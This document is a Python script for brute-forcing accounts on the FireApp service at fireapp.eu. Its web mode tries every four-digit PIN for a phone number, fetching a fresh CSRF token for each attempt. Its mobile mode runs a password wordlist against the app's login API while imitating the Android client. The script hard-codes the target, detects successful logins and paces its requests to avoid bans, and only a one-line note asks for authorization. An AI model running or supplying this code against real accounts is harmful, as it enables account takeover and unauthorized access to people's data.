#!/usr/bin/env python3
"""
Controlled FireApp brute-force helper.
Use only against targets you are explicitly authorized to test.

Modes:
  web-pin     brute force /user/login.php  (telefon + short PIN)
  mobile-pass brute force /API/login.php   (phone + app password wordlist)

Rate limiting is built-in to reduce ban risk.
"""
import argparse, re, sys, time
from urllib.parse import urlencode

import httpx

FA = "https://fireapp.eu"


def web_pin_brute(telefon: str, start: int, end: int, delay: float):
    print(f"[*] Web PIN brute: {telefon}  range {start:04d}-{end-1:04d}  delay {delay}s")
    for pin_int in range(start, end):
        pin = f"{pin_int:04d}"
        try:
            r1 = httpx.get(f"{FA}/user/login.php", timeout=15)
            m = re.search(r'name=["\']?eg-csrf-token-label["\']?\\s+value=["\']([^"\']+)["\']', r1.text)
            if not m:
                m = re.search(r'value=["\']([^"\']+)["\']\\s+name=["\']?eg-csrf-token-label["\']?', r1.text)
            csrf = m.group(1) if m else ""
            cookies = dict(r1.cookies)
            body = f"telefon={telefon}&pin={pin}&eg-csrf-token-label={csrf}"
            r2 = httpx.post(
                f"{FA}/user/login.php",
                content=body,
                headers={"Content-Type":"application/x-www-form-urlencoded","Referer":f"{FA}/user/login.php"},
                cookies=cookies,
                follow_redirects=True,
                timeout=15,
            )
            title_m = re.search(r"<title>(.*?)</title>", r2.text, re.I)
            title = title_m.group(1).strip() if title_m else "no title"
            path = r2.url.path
            if title != "FireApp | LOGIN" or path != "/user/login.php":
                print(f"[+] SUCCESS on pin={pin}  title={title}  path={path}")
                return pin
            if pin_int % 100 == 0:
                print(f"[-] tried up to {pin} ...")
        except Exception as e:
            print(f"[!] error at {pin}: {e}")
        time.sleep(delay + 0.1)
    print("[-] PIN not found in range")
    return None


def mobile_pass_brute(phone: str, wordlist_path: str, delay: float):
    print(f"[*] Mobile app password brute: {phone}  wordlist {wordlist_path}")
    with open(wordlist_path) as f:
        passwords = [line.strip() for line in f if line.strip()]
    device = "BRUTEFORCE01"
    for i, pw in enumerate(passwords):
        body = f"phone={phone}&password={pw}&SDKver=33&device={device}&OStype=android&fcm=disabled"
        try:
            r = httpx.post(
                f"{FA}/API/login.php",
                content=body,
                headers={"Content-Type":"application/x-www-form-urlencoded","User-Agent":"FireApp/515 (Android 13)"},
                timeout=12,
            )
            data = r.json()
            if data.get("status") == "success":
                print(f"[+] SUCCESS password={pw}")
                return pw
            if i % 50 == 0:
                print(f"[-] tried {i} passwords, last {pw}")
        except Exception as e:
            print(f"[!] error at {pw}: {e}")
        time.sleep(delay + 0.05)
    print("[-] password not found")
    return None


def main():
    parser = argparse.ArgumentParser(description="FireApp brute-force helper (authorized testing only)")
    parser.add_argument("mode", choices=["web-pin", "mobile-pass"])
    parser.add_argument("--phone", "--telefon", required=True)
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--end", type=int, default=10000)
    parser.add_argument("--wordlist")
    parser.add_argument("--delay", type=float, default=0.8, help="seconds between attempts")
    args = parser.parse_args()

    if args.mode == "web-pin":
        web_pin_brute(args.phone, args.start, args.end, args.delay)
    elif args.mode == "mobile-pass":
        if not args.wordlist:
            print("[!] --wordlist required for mobile-pass")
            sys.exit(1)
        mobile_pass_brute(args.phone, args.wordlist, args.delay)


if __name__ == "__main__":
    main()
